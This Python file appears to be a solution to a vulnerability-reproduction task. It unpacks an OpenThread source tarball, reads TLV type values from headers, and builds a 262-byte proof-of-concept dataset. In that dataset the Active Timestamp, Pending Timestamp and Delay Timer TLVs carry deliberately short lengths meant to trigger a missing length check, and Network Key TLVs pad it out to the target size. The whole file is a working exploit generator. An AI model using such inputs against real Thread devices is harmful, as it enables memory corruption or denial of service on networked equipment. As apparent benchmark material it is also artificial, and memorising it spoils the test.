import os
import tarfile
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball to examine vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source code
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for OpenThread source structure
            root_dir = Path(tmpdir)
            openthread_dir = None
            
            # Common OpenThread source patterns
            for path in root_dir.rglob('dataset.cpp'):
                if 'openthread' in str(path).lower() or 'thread' in str(path).lower():
                    openthread_dir = path.parent
                    break
            
            if openthread_dir is None:
                # Fallback: search for any dataset.cpp
                for path in root_dir.rglob('dataset.cpp'):
                    openthread_dir = path.parent
                    break
            
            # Read and analyze the vulnerable source to understand TLV structure
            dataset_cpp = openthread_dir / 'dataset.cpp' if openthread_dir else None
            
            if dataset_cpp and dataset_cpp.exists():
                with open(dataset_cpp, 'r') as f:
                    content = f.read()
                    
                # Look for TLV type definitions in related headers
                tlv_types = {}
                for header in openthread_dir.glob('*.h'):
                    try:
                        with open(header, 'r') as f:
                            header_content = f.read()
                            # Look for TLV type constants
                            if 'ActiveTimestamp' in header_content:
                                lines = header_content.split('\n')
                                for line in lines:
                                    if 'ActiveTimestamp' in line and '0x' in line:
                                        parts = line.split()
                                        for part in parts:
                                            if '0x' in part:
                                                hex_val = part.split('0x')[1].rstrip(';,')
                                                if hex_val:
                                                    tlv_types['ActiveTimestamp'] = int(hex_val, 16)
                                                    break
                            if 'PendingTimestamp' in header_content:
                                lines = header_content.split('\n')
                                for line in lines:
                                    if 'PendingTimestamp' in line and '0x' in line:
                                        parts = line.split()
                                        for part in parts:
                                            if '0x' in part:
                                                hex_val = part.split('0x')[1].rstrip(';,')
                                                if hex_val:
                                                    tlv_types['PendingTimestamp'] = int(hex_val, 16)
                                                    break
                            if 'DelayTimer' in header_content:
                                lines = header_content.split('\n')
                                for line in lines:
                                    if 'DelayTimer' in line and '0x' in line:
                                        parts = line.split()
                                        for part in parts:
                                            if '0x' in part:
                                                hex_val = part.split('0x')[1].rstrip(';,')
                                                if hex_val:
                                                    tlv_types['DelayTimer'] = int(hex_val, 16)
                                                    break
                    except:
                        continue
            
            # If we couldn't parse headers, use common OpenThread TLV values
            if not tlv_types:
                tlv_types = {
                    'ActiveTimestamp': 0x07,  # Common OpenThread TLV type
                    'PendingTimestamp': 0x08,  # Common OpenThread TLV type
                    'DelayTimer': 0x09         # Common OpenThread TLV type
                }
            
            # Create PoC based on OpenThread Dataset TLV structure
            # Format: [TLV Type][Length][Value...]
            # The vulnerability: length validation missing for certain TLVs
            
            # Start with Dataset header (simplified)
            poc = bytearray()
            
            # Add Active Timestamp TLV with insufficient length to trigger overflow
            # Type = ActiveTimestamp, Length = 1 (less than required minimum of 8 for uint64_t)
            poc.append(tlv_types['ActiveTimestamp'])  # TLV Type
            poc.append(1)  # Length = 1 byte (insufficient!)
            poc.append(0xAA)  # Single byte value (should be 8 bytes for timestamp)
            
            # Add Pending Timestamp TLV with insufficient length
            poc.append(tlv_types['PendingTimestamp'])  # TLV Type
            poc.append(1)  # Length = 1 byte (insufficient!)
            poc.append(0xBB)  # Single byte value
            
            # Add Delay Timer TLV with insufficient length
            poc.append(tlv_types['DelayTimer'])  # TLV Type
            poc.append(1)  # Length = 1 byte (insufficient!)
            poc.append(0xCC)  # Single byte value
            
            # Pad to match ground-truth length of 262 bytes
            # Add valid TLVs to make the dataset appear normal while triggering the bug
            padding_needed = 262 - len(poc)
            
            if padding_needed > 0:
                # Add Network Key TLV (type 0x0E) with proper length to fill space
                # This makes the dataset look valid overall
                network_key_type = 0x0E  # Common Network Key TLV type
                network_key_length = 16  # Standard network key length
                
                # Calculate how many network key TLVs we can fit
                tlv_overhead = 2  # Type + Length bytes
                key_data_size = network_key_length
                full_tlv_size = tlv_overhead + key_data_size
                
                while len(poc) + full_tlv_size <= 262:
                    poc.append(network_key_type)
                    poc.append(network_key_length)
                    poc.extend(b'\x11' * network_key_length)  # Dummy key data
                
                # Fill remaining bytes with zeros
                remaining = 262 - len(poc)
                if remaining > 0:
                    poc.extend(b'\x00' * remaining)
            
            # Trim if somehow we exceeded 262
            poc = poc[:262]
            
            return bytes(poc)